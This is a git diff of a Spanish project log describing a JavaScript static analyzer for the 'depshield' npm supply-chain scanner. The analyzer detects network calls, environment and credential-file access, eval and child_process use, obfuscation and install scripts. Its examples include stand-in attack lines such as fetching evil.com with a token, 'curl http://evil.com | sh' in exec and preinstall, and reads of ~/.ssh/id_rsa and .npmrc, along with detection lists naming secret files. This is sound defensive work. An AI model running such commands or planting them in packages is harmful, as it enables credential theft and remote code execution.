@@ -706,7 +706,269 @@ git push origin main
 
 ---
 
-## 7. Estado actual del proyecto
+## 7. PASO 4 — Analizador estático de JavaScript
+
+**Objetivo:** Crear un módulo capaz de analizar el código fuente JavaScript de cualquier paquete npm, buscando patrones de comportamiento sospechoso que puedan indicar actividad maliciosa. El análisis se realiza sin ejecutar el código, mediante inspección del Árbol de Sintaxis Abstracta (AST) generado por el parser `esprima`.
+
+### 7.1. Módulo creado: `depshield/analyzers/js_analyzer.py`
+
+Se creó el subpaquete `depshield/analyzers/`:
+
+```
+depshield/analyzers/
+├── __init__.py
+└── js_analyzer.py
+```
+
+Este módulo es el primero de los tres analizadores del pipeline (JS, Python, metadatos). Recibe la ruta a un directorio con código fuente JavaScript (proporcionada por el downloader del PASO 3) y devuelve una lista de hallazgos (*findings*) estructurados.
+
+### 7.2. Modelo de datos — `Finding`
+
+Se definió un dataclass que representa un hallazgo individual en el código fuente:
+
+```python
+@dataclass
+class Finding:
+    signal_type: str       # Tipo de señal: "NETWORK_CALLS", "CODE_EXECUTION", etc.
+    severity: str          # "HIGH", "MEDIUM" o "LOW"
+    file: str              # Ruta relativa al fichero
+    line: int              # Número de línea (1-based, 0 si desconocido)
+    snippet: str           # Fragmento de código relevante (máx 100 caracteres)
+```
+
+Este modelo será compartido por los analizadores de Python (PASO 5) y metadatos (PASO 6), garantizando una interfaz uniforme para el scorer (PASO 7).
+
+### 7.3. Estrategia de análisis: AST + regex fallback
+
+El análisis se implementó con una estrategia de **doble capa**:
+
+1. **Capa primaria — Esprima AST:** Se parsea el fichero JavaScript con la librería `esprima` (port Python del parser de referencia de ECMAScript). El AST resultante se recorre recursivamente buscando nodos específicos que indiquen comportamiento sospechoso. Esto proporciona detección precisa con contexto semántico.
+
+2. **Capa de fallback — Regex:** Si `esprima` no puede parsear el fichero (por ejemplo, por usar sintaxis JSX, TypeScript, optional chaining `?.`, o ECMAScript 2020+), se captura la excepción y se aplica un conjunto de expresiones regulares que buscan los mismos patrones sobre el código fuente como texto plano. Esto sacrifica precisión a cambio de cobertura.
+
+```python
+def analyze_file(filepath, source=None) -> list[Finding]:
+    try:
+        import esprima
+        ast = esprima.parseScript(source, loc=True, tolerant=True)
+        tree = ast.toDict()
+        # Análisis AST preciso sobre el árbol
+        findings = []
+        findings.extend(_check_network_ast(tree, ...))
+        findings.extend(_check_env_ast(tree, ...))
+        # ... (6 señales)
+        return findings
+    except Exception:
+        # esprima falló → fallback a regex
+        return _analyze_with_regex(source, filepath)
+```
+
+### 7.4. Recorrido del AST
+
+Para inspeccionar el AST, se implementó una función recursiva `_walk_ast()` que genera todos los nodos del árbol en preorden. Cada nodo es un diccionario con un campo `type` que indica su clase (ej. `CallExpression`, `MemberExpression`, `Literal`, `NewExpression`).
+
+```python
+def _walk_ast(node: dict) -> list[dict]:
+    """Recorre recursivamente todos los nodos del AST."""
+    nodes = [node]
+    for value in node.values():
+        if isinstance(value, dict):
+            nodes.extend(_walk_ast(value))
+        elif isinstance(value, list):
+            for item in value:
+                if isinstance(item, dict):
+                    nodes.extend(_walk_ast(item))
+    return nodes
+```
+
+Complementariamente, `_get_node_name()` extrae un nombre legible de un nodo `callee`, resolviendo cadenas de `MemberExpression` como `child_process.exec` a partir de los nodos anidados `object` → `property`.
+
+### 7.5. Las 6 señales de comportamiento malicioso
+
+#### Señal 1: NETWORK_CALLS — Llamadas de red
+
+Detecta intentos de comunicación con servidores externos, lo que puede indicar exfiltración de datos o descarga de payloads.
+
+**Detección AST:**
+- Nodos `CallExpression` cuyo `callee` sea: `fetch`, `XMLHttpRequest`, `http.request`, `http.get`, `https.request`, `https.get`, `axios`, `axios.get`, `axios.post`, `request`, `got`, `got.get`, `node-fetch`.
+- Nodos `Literal` (strings) que coincidan con el patrón `https?://` (URLs embebidas).
+
+**Severidad:**
+- `HIGH` para llamadas directas a funciones de red.
+- `MEDIUM` para URL literals (pueden ser legítimas, ej. documentación).
+
+**Ejemplo detectado:**
+```javascript
+// HIGH: llamada directa a fetch
+fetch("https://evil.com/exfil?data=" + token);
+
+// MEDIUM: URL literal
+var api = "https://malicious-c2.com/data";
+```
+
+#### Señal 2: ENV_ACCESS — Acceso a variables de entorno
+
+Detecta accesos a `process.env` y `process.argv`, que pueden usarse para robar tokens, API keys u credenciales almacenadas en el entorno del desarrollador.
+
+**Detección AST:**
+- Nodos `MemberExpression` cuyo nombre resuelto sea `process.env` o `process.argv`.
+
+**Severidad:** `HIGH` — el acceso a variables de entorno en un paquete de utilidad es altamente sospechoso.
+
+**Ejemplo detectado:**
+```javascript
+var token = process.env.NPM_TOKEN;    // HIGH: roba el token de npm
+var secret = process.env.AWS_SECRET;  // HIGH: roba credenciales de AWS
+```
+
+#### Señal 3: FILE_SENSITIVE — Acceso a ficheros sensibles
+
+Detecta accesos a rutas del sistema de ficheros que contienen credenciales, claves SSH o configuraciones sensibles.
+
+**Detección AST:**
+- Nodos `Literal` (strings) que contengan alguno de estos patrones: `.ssh`, `.npmrc`, `.env`, `.aws`, `.gnupg`, `/etc/passwd`, `/etc/shadow`, `id_rsa`, `id_ed25519`, `.bash_history`, `.zsh_history`.
+
+**Severidad:** `HIGH` — un paquete legítimo no debería acceder a claves SSH o credenciales del sistema.
+
+**Ejemplo detectado:**
+```javascript
+fs.readFileSync("/home/user/.ssh/id_rsa");   // HIGH: roba clave SSH
+var rc = path.join(homedir, ".npmrc");         // HIGH: roba token npm
+```
+
+#### Señal 4: CODE_EXECUTION — Ejecución dinámica de código
+
+Detecta mecanismos para ejecutar código de forma dinámica, lo que se usa frecuentemente para evadir análisis estático y ejecutar payloads descargados en runtime.
+
+**Detección AST:**
+- Nodos `CallExpression` cuyo `callee` sea: `eval`, `Function`, `child_process.exec`, `child_process.execSync`, `child_process.spawn`, `child_process.spawnSync`, `child_process.fork`.
+- Nodos `NewExpression` cuyo `callee` sea `Function` (para capturar `new Function("...")`).
+- Nodos `CallExpression` donde `require('child_process')` sea el argumento.
+
+**Nota técnica:** La detección de `new Function()` requirió una corrección durante el desarrollo, ya que esprima representa `new Function()` como un nodo `NewExpression` (no `CallExpression`). La primera versión del analizador solo buscaba en `CallExpression` y no detectaba este patrón.
+
+**Severidad:** `HIGH` — la ejecución dinámica de código es una de las técnicas más peligrosas.
+
+**Ejemplo detectado:**
+```javascript
+eval(Buffer.from(encoded, 'base64').toString());  // HIGH: ejecuta payload
+var fn = new Function("return " + data);           // HIGH: constructor dinámico
+var cp = require("child_process");                 // HIGH: acceso a shell
+child_process.exec("curl http://evil.com | sh");   // HIGH: ejecución remota
+```
+
+#### Señal 5: OBFUSCATION — Técnicas de ofuscación
+
+Detecta técnicas comúnmente usadas para ocultar el verdadero propósito del código, dificultando la revisión manual y la detección por herramientas de seguridad.
+
+**Detección AST:**
+- `Buffer.from(..., 'base64')`: decodificación de Base64, usada para ocultar strings maliciosos.
+- `atob(...)`: decodificación de Base64 en el navegador/Node.js moderno.
+- `String.fromCharCode(...)` con más de 5 argumentos: construcción de strings carácter a carácter para evadir detección.
+- Strings hexadecimales largas (>50 caracteres): payloads codificados en hexadecimal.
+
+**Severidad:**
+- `HIGH` para `Buffer.from(base64)`, `String.fromCharCode` masivo.
+- `MEDIUM` para `atob()`, strings hexadecimales (pueden ser legítimas, ej. hashes SHA).
+
+**Ejemplo detectado:**
+```javascript
+// HIGH: decodificación Base64 de payload
+var payload = Buffer.from("Y3VybCBodHRwOi8vZXZpbC5jb20=", "base64");
+
+// HIGH: construcción char-by-char para evadir detección
+var cmd = String.fromCharCode(99,117,114,108,32,104,116,116,112);
+
+// MEDIUM: string hex larga (podría ser legítima)
+var data = "4a6f686e20446f6520736563726574206b6579203132333435";
+```
+
+#### Señal 6: INSTALL_SCRIPTS — Scripts de instalación peligrosos
+
+Detecta la presencia de lifecycle scripts en `package.json` que se ejecutan automáticamente durante `npm install`. Esta es una de las técnicas más comunes de ataque: el código malicioso se esconde en un script `postinstall` que se ejecuta sin que el desarrollador lo sepa.
+
+**Detección:** Se parsea el fichero `package.json` y se buscan las claves `preinstall`, `postinstall` y `preuninstall` dentro del objeto `scripts`.
+
+**Nota:** Esta señal no usa AST de JavaScript, sino parsing JSON del `package.json`. Se implementó como una función separada `_check_install_scripts()`.
+
+**Severidad:** `HIGH` — la ejecución automática durante la instalación es el vector de ataque más directo.
+
+**Ejemplo detectado:**
+```json
+{
+  "name": "evil-package",
+  "scripts": {
+    "postinstall": "node steal-tokens.js",    // HIGH
+    "preinstall": "curl http://evil.com | sh"  // HIGH
+  }
+}
+```
+
+### 7.6. Regex fallback — Cobertura para JS moderno
+
+Cuando esprima falla (JSX, TypeScript, ES2020+, optional chaining, etc.), se activa un conjunto de 11 expresiones regulares que cubren las mismas 6 señales:
+
+```python
+_REGEX_PATTERNS = [
+    ("NETWORK_CALLS", "HIGH",  re.compile(r"\b(fetch|axios|http\.request)\s*\(")),
+    ("NETWORK_CALLS", "MEDIUM", re.compile(r"""["']https?://[^"']+["']""")),
+    ("ENV_ACCESS",    "HIGH",  re.compile(r"\bprocess\.(env|argv)\b")),
+    ("FILE_SENSITIVE","HIGH",  re.compile(r"""["'].*?\.ssh.*?["']""")),
+    ("CODE_EXECUTION","HIGH",  re.compile(r"\b(eval|Function)\s*\(")),
+    ("CODE_EXECUTION","HIGH",  re.compile(r"""require\s*\(\s*["']child_process["']\)""")),
+    ("OBFUSCATION",  "HIGH",  re.compile(r"""Buffer\.from\s*\([^)]+,\s*["']base64["']\)""")),
+    ("OBFUSCATION",  "MEDIUM", re.compile(r"\batob\s*\(")),
+    # ... etc.
+]
+```
+
+El fallback recorre el código línea por línea, aplicando cada regex y generando `Finding` con la línea exacta y el fragmento que coincide.
+
+### 7.7. API pública del módulo
+
+```python
+# Analizar un solo fichero
+def analyze_file(filepath, source=None) -> list[Finding]:
+    """Analiza un fichero JS. Usa esprima AST con fallback a regex."""
+
+# Analizar un directorio completo
+def analyze_directory(directory) -> list[Finding]:
+    """Analiza todos los .js + package.json de un directorio recursivamente."""
+```
+
+`analyze_directory()` se usará por el scanner (PASO 8) para analizar cada paquete descargado por el downloader.
+
+### 7.8. Verificación
+
+Se crearon 23 tests unitarios organizados por categoría:
+
+| Categoría | Tests | Descripción |
+|---|---|---|
+| NETWORK_CALLS | 3 | fetch(), http.request(), URL literal |
+| ENV_ACCESS | 2 | process.env, process.argv |
+| FILE_SENSITIVE | 3 | .ssh/id_rsa, .npmrc, /etc/passwd |
+| CODE_EXECUTION | 4 | eval(), new Function(), require('child_process'), child_process.exec() |
+| OBFUSCATION | 4 | Buffer.from(base64), atob(), hex string >50 chars, String.fromCharCode |
+| INSTALL_SCRIPTS | 3 | postinstall detectado, preinstall detectado, scripts seguros (0 findings) |
+| analyze_directory | 2 | Escaneo de múltiples .js, inclusión de package.json |
+| Regex fallback | 1 | Código JSX (esprima falla → regex detecta) |
+| Código limpio | 1 | Función `add()` pura → 0 findings |
+
+**Resultado:** 23/23 PASSED en 0.21 segundos.
+
+El test de `new Function()` fue especialmente revelador: en la primera ejecución falló porque `new Function("return 1")` genera un nodo `NewExpression` en el AST de esprima, no un `CallExpression`. Esto obligó a añadir detección explícita de `NewExpression` en el checker de `CODE_EXECUTION`.
+
+### 7.9. Commit
+
+```powershell
+git add .
+git commit -m "PASO 4: JavaScript static analyzer with esprima AST and regex fallback (6 signal types)"
+git push origin main
+```
+
+---
+
+## 8. Estado actual del proyecto
 
 > **Última actualización:** 1 de abril de 2026
 
@@ -721,9 +983,12 @@ depshield/
 │   │   ├── __init__.py
 │   │   ├── npm_resolver.py       # ✅ PASO 1
 │   │   └── pypi_resolver.py      # ✅ PASO 2
-│   └── downloaders/
+│   ├── downloaders/
+│   │   ├── __init__.py
+│   │   └── package_downloader.py # ✅ PASO 3
+│   └── analyzers/
 │       ├── __init__.py
-│       └── package_downloader.py  # ✅ PASO 3
+│       └── js_analyzer.py        # ✅ PASO 4
 ├── tests/
 │   └── __init__.py
 ├── .venv/                        # Entorno virtual
@@ -742,8 +1007,8 @@ depshield/
 | ~~1~~ | ~~npm resolver~~ | ✅ Completado |
 | ~~2~~ | ~~PyPI resolver~~ | ✅ Completado |
 | ~~3~~ | ~~Downloader~~ | ✅ Completado |
-| **4** | **JS analyzer** | ⏳ Pendiente |
-| 5 | Python analyzer | ⏳ Pendiente |
+| ~~4~~ | ~~JS analyzer~~ | ✅ Completado |
+| **5** | **Python analyzer** | ⏳ Pendiente |
 | 6 | Metadata analyzer | ⏳ Pendiente |
 | 7 | Scorer + Report | ⏳ Pendiente |
 | 8 | Scanner + CLI | ⏳ Pendiente |
